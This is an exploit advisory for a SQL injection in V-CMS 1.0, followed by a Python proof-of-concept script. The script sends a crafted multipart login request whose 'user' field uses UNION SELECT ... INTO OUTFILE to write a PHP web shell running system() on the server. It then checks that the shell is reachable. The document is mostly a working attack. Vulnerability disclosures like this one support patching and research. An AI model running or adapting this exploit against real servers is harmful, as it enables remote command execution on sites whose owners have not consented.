# ------------------------------------------------------------------------
# Software................V-CMS 1.0
# Vulnerability...........SQL Injection
# Threat Level............Critical (4/5)
# Download................http://v-cms.org/
# Discovery Date..........11/13/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A sql injection vulnerability in V-CMS 1.0 can be exploited to extract
# arbitrary data. In some environments it may be possible to create a
# PHP shell.
# 
# 
# --PoC--

import socket

host = 'localhost'
path = '/v-cms'
shell_path = '/shell.php'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST /v-cms/process.php?logout=0testab\'testxy HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 709\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Cookie: cookname=9testab\'testxy; cookid=10testab\'testxy\r\n'
           'Accept: text/html\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="sublogin"\r\n'
           '\r\n'
           '1testab\'testxy\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="user"\r\n'
           '\r\n'
           '\'and 1=0 UNION SELECT \'<?php echo system($_GET["CMD"]); ?>\' FROM dual INTO OUTFILE \'../../htdocs/shell.php\';#\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="pass"\r\n'
           '\r\n'
           '3testab\'testxy\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="remember"\r\n'
           '\r\n'
           '4testab\'testxy\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="subjoin"\r\n'
           '\r\n'
           '5testab\'testxy\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="subforgot"\r\n'
           '\r\n'
           '6testab\'testxy\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="subedit"\r\n'
           '\r\n'
           '7testab\'testxy\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="subConfirm"\r\n'
           '\r\n'
           '8testab\'testxy\r\n'
           '------x--\r\n'
           '\r\n')

    resp = s.recv(8192)

    http_ok = 'HTTP/1.1 200 OK'
    http_redirect = 'HTTP/1.1 302 Found'
    
    if http_redirect not in resp[:len(http_redirect)]:
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192)[:len(http_ok)]: print 'shell not found'        
    else: print 'shell located at http://' + host + shell_path

upload_shell()
